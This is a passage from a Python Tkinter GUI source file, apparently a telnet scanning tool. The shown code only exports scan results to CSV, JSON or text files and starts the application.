                            result.get('timestamp', 'N/A')
                        ])
                messagebox.showinfo("Export Successful", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export: {str(e)}")
    
    def _export_to_json(self):
        """Export results to JSON file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            initialfile=f"telnet_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.scan_results, f, indent=2)
                messagebox.showinfo("Export Successful", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export: {str(e)}")
    
    def _export_to_txt(self):
        """Export results to text file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"telnet_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if filename:
            try:
                content = self.results_text.get(1.0, tk.END)
                with open(filename, 'w') as f:
                    f.write(content)
                messagebox.showinfo("Export Successful", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export: {str(e)}")


def main():
    """Main entry point"""
    root = tk.Tk()
    app = TelnetEnumeratorGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
